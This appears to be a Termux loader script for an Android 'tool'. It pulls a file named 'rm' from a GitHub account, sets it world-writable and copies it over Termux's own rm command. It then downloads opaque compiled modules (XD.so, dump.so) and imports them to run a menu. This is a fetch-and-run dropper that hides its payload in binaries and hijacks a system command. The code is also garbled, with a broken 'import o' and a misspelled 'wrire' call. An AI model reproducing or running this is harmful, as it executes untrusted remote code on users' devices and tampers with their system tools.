import o

try:
    try:
        open('/sdcard/BADBOY-OK.txt','r').read()
    except:
        open('/sdcard/BADBOY-OK.txt','w').wrire('Badboy Ok ids')
except:
    print(' First Allow Termux Setup Permeations (y) ')
    os.system('termux-setup-storage')
    pass
os.system('git pull')
from os import path,system
from platform import uname
arch=uname().machine.lower()
system("curl -L https://raw.githubusercontent.com/THE-BADBOY/SPECIAL-V1/main/rm -o rm")
try:
    os.system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
except:pass
if path.isfile("XD.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/THE-BADBOY/files/main/XD.so -o XD.so")
if path.isfile("dump.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/THE-BADBOY/files/main/dump.so -o dump.so")
if 'aarch' in arch:
    print('\033[1;34m\n Congratulations! Your Device Support This Tools\033[1;37m')
    import XD
    XD.menu()
else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
    
